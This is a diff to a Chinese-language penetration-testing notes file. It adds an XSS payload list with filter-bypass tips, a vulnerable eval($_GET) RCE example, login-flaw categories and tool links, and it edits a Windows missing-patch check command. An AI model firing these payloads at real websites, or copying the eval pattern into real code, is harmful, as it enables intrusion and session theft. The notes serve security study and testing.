@@ -169,6 +169,7 @@
         - [垂直越权](#垂直越权)
         - [防御](#防御-2)
   - [登录脆弱](#登录脆弱)
+    - [漏洞类型](#漏洞类型)
     - [验证脆弱](#验证脆弱)
       - [开发者不严谨](#开发者不严谨)
         - [验证码破解](#验证码破解)
@@ -235,6 +236,7 @@
       - [堆叠查询注入](#堆叠查询注入)
       - [cookie 注入](#cookie-注入)
   - [xss攻击](#xss攻击)
+    - [基础使用](#基础使用)
     - [典型用法](#典型用法)
     - [工具](#工具-3)
       - [XSStrike](#xsstrike)
@@ -246,7 +248,7 @@
   - [CSRF](#csrf)
     - [实战](#实战)
     - [防御](#防御-5)
-  - [待补充：模板注入](#待补充模板注入)
+  - [模板注入](#模板注入)
   - [SSRF](#ssrf)
     - [常见攻击](#常见攻击)
       - [图片上传](#图片上传)
@@ -478,6 +480,7 @@
 - [待补充：隐藏技术](#待补充隐藏技术)
   - [实用工具](#实用工具)
     - [日志删除](#日志删除)
+
 # 写在前面
 
 **作者：北丐**
@@ -1621,17 +1624,13 @@ www.xxx.com 加上/static;/backup
 
 御剑后台扫描珍藏版下载网站](https://www.nnapp.cn/?post=211)；御剑55w增强版字典[文章有百度网盘链接](https://www.icode9.com/content-4-87412.html); 御剑85w 字典：http://www.coder100.com/index/index/content/id/833812
 
-使用十分简单。但是我在对同一个站点进行扫描两次的时候，发现结果不一样，因为我网速不好，但采用了默认的中断时常3秒。但目录有限，四万多很多都是php文件路径，目录路径，如果你的电脑能受得了。可以选择........
-更正：也可以是ip
-![御剑](https://img-blog.csdnimg.cn/20210609115717971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-
-
+使用十分简单。但是我在对同一个站点进行扫描两次的时候，发现结果不一样，因为我网速不好，但采用了默认的中断时常3秒。但目录有限，四万多很多都是php文件路径，目录路径，如果你的电脑能受得了。
 拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名
 **dirbuster**
-kali自带ka的一款工具，fuzz很方便。kali中直接在命令行中输入dirbuster，我认为该工具更强大，同样支持字典，还支持递归搜索和纯粹爆破，纯粹爆破你可以选择A-Z0-9a-z_，对于定向攻击来说纯粹爆破太强大了，直接帮助我发现隐藏各个目录,我在利用纯粹爆破将线程拉到50，仍旧需要10000+天以上（缺点是我用虚拟机跑的，字典大就慢）
+kali自带的一款工具，fuzz很方便。kali中直接在命令行中输入dirbuster，我认为该工具更强大，同样支持字典，还支持递归搜索和纯粹爆破，纯粹爆破你可以选择A-Z0-9a-z_，对于定向攻击来说纯粹爆破太强大了，直接帮助我发现隐藏各个目录,我在利用纯粹爆破将线程拉到50，仍旧需要10000+天以上（缺点是我用虚拟机跑的，字典大就慢）
 
-
+**dirsearch**
+https://github.com/maurosoria/dirsearch
 ##### 目录爆破经验
 
 网上很多目录爆破只讲述了通过御剑或类似工具对URL进行拼接
@@ -2539,11 +2538,6 @@ jackson反序列化：利用需要特定条件，不常用
 apache solr反序列化：
 
 ## 文件操作
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712164618229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-文件读取
-读取系统敏感文件
 文件包含
 可读取文件或代码执行
 文件删除
@@ -2555,11 +2549,10 @@ apache solr反序列化：
 如果是CSV 或者 Excel可以注意一下CSV注入
 
 ### 文件读取
+带来危害
+* 黑盒：目录遍历。读取系统敏感文件
+* 白盒：sql读写函数:load_file()和into outfile/dumpfile
 
-这通常是值sql中读写
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705181705882.png)
-具体搜索关键字 常见load_file读取敏感信息.
-这里要想使用得好这个函数，你需要结合我前面写的‘路径读取’来达到效果
 
 **写入**
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705183450890.png)
@@ -2848,7 +2841,20 @@ uid、用户名、cookie的uid、电话号
 
 **登录类型**
 在多个系统中，用户只需一次登录，各个系统即可感知该用户已经登录。比如阿里系的淘宝和天猫，很明显地我们可以知道这是两个系统，但是你在使用的时候，登录了天猫，淘宝也会自动登录。
-
+### 漏洞类型
+* 开放性跳转（high）
+> 登录成功通常都有跳转
+> 
+* 密码明文或可被识别出的加密算法
+> 登录成功通常都有跳转
+* 用户密码可被枚举
+> 提示用户名错误
+> 无验证码或可绕过，ip不封锁
+> 
+* 自动登录参数暴露敏感信息（info）
+ > 看参数值可以被验证是某框架
+* 会话固定
+> 登陆前通过软件工具抓取到的cookie信息值与在登录后抓取到的cookie进行对比，如果其值一样，则可判断其会话的cookies或者sessions未进行更新
 ### 验证脆弱
 
 
@@ -3153,11 +3159,14 @@ oob
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714142934224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ## RCE（远程命令执行）
+在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理，这就可能造成被执行敏感命令，如下：
+```bash
+#  当被执行index.php?page=1;phpinfo()将会产生漏洞
+$var = $_GET['page'];
+eval($var);
+```
 
-在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞比如eval().或者一些参数id可以执行echo &id等命令。
-当遇到这种漏洞，你可以执行一些敏感命令。
-
-**函数**
+**白盒测试RCE敏感函数**
 常见的几种语言都有字符串转化为代码的执行函数
 php：eval、assert、system
 python：exec
@@ -3664,6 +3673,9 @@ cookie注入 后接cookie值
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705235758892.png)
 
 ## xss攻击
+
+
+
 **攻击严重性**
 xss攻击对提交表单或发出的链接请求中所有变量嵌入执行javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强就意味着xss能达到什么样的攻击。
 
@@ -3671,17 +3683,52 @@ xss攻击对提交表单或发出的链接请求中所有变量嵌入执行javas
 只要有允许用户输入数据的，且后端没有接受过滤的就存在xss攻击比如对你的用户名展示，对你输入的东西展示。常见出现在：
 
  - 表单框：搜索框、文本编辑框、留言框
- - html参数
- - 网站callback
+ - html参数：具体参数、页码
+ - 网站callback：访问ip回显、上传文件未经过过滤直接回显到界面
  - 文件名、用户名
+ - 跳转 https://www.test.com/?redirect_to=jav ascript:alert('XSS');
+
 
 
 **技巧：从phpinfo返回信息获得管理权限**
 phpinfo展示界面中拥有cookie值，你获取到这个之后可以访问网站，进行xss操作，如获取源码等
 
+**知名靶场**
+[xss-lab](https://github.com/rebo-rn/xss-lab)与[答案](https://www.cnblogs.com/wangyuyang1016/p/13532898.html#_caption_3)
+### 基础使用
+
+```bash
+# 常规payload，一般一个测试注入点会每条都尝试
+<script>alert(1)</script>
+<b onmouseover=alert(1)>Click Me!</b>
+<svg onload=alert(1)><body onload="alert('XSS')">
+<img src="ddksah" onerror=alert(1);> # 
+' onclick='alert(1) # INPUT可以加onclick属性值
+"> <a href="javascript:alert(1)">sfdst</a>
+
+# 一些实用性高的payload 
+<a href="javascript&#58;alert('\<%E6%B5%8B%E8%AF%95\>')">jump</a> #參考https://segmentfault.com/a/1190000019980090
+
+
+# 绕过（通常一句XSS代码会同时结合以下策略）
+浏览器进行绘制时，解码顺序分别为 HTML > URL > JS；使用html编码 https://tool.oschina.net/encode/
+大小写混写
+多个关键字
+如果被过滤了空格则用%0a
+
+
+# 需闭合
+这是一般执行输出框中插入XSS语句，而url参数通常不用；
+# 以下代码展示了输入框的常见写法
+<input name="t_sort" value="" type="">
+
+```
+
+
+
 ### 典型用法
 
-虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址
+虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly(禁止js读取cookie），对方要触发这个漏洞地址
 cookie还要有意义，如果对方是未登录状态的cookie就索然无味了。一般这种攻击要么就是在肯定对方大概率会查看你的页面时要么就是定向。
 典型用法的代码参考与书籍《渗透测试实战》
 
@@ -3779,6 +3826,8 @@ beef还是很强大的，入侵成功后可以对对方页面进行跳转或者�
 #### 防御
 特殊字符过滤
 特殊字符转义
+长度限制
+xss-proretion参数
 http-only（防御xss的cookie盗取，你可以破解此防御的方案之一是采用CRLF做分割）
 
 
@@ -3793,9 +3842,6 @@ eval转换
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(2222222222222222) )
 不常见函数
 
-```bash
-<b onmouseover=alert('XSS')>Click Me!</b><svg onload=alert(1)><body onload="alert('XSS')"><img src="http://test.cyberspacekittens.com" onerror=alert(document.cookie);>
-```
 
 **工具**
 fuzz
@@ -3839,9 +3885,8 @@ http://www.jsfuck.com/
 >4.设置验证码
 >5.限制请求方式只能为POS
 
-## 待补充：模板注入
-
-模板引擎由于其模块化和简洁的代码与标准 HTML 相比而被更频繁地使用。模板注入是指用户输入直接传递到渲染模板，允许修改底层模板
+## 模板注入
+模板引擎是允许开发者或设计师在创建动态网页的时候，从数据展示中分离编程逻辑的工具，模板引擎由于其模块化和简洁的代码与标准 HTML 相比而被更频繁地使用。模板注入是指用户输入直接传递到渲染模板，允许修改底层模板
 
 ## SSRF
 
@@ -5567,7 +5612,8 @@ windows权限分为四种，由低到高的权限分别是user，administrator�
 常见的公开漏洞要自己收集，具体怎么搜集后续我补充
 
 ```bash
-systeminfo|(for %i in (KB5003537 KB2160329 等常见的公开漏洞)do @find /i "%i">null||@echo %i bug here! )
+# 写错了！！有bug。。
+systeminfo > windows.txt|(for %i in (KB5003537 KB2160329 等常见的公开漏洞)do @find /i "%i">null||@echo %i bug here! )
 ```
 
 或者你直接对输出的systeminfo利用kali 将提取任何给定的 Windows 主机的所有补丁安装历史记录。我们可以拿回这个输出结果，将其复制到我们的 Kali 系统并运行 Windows Exploit Suggester 以查找已知的漏洞然后针对性的进行漏洞利用从而提升权限。
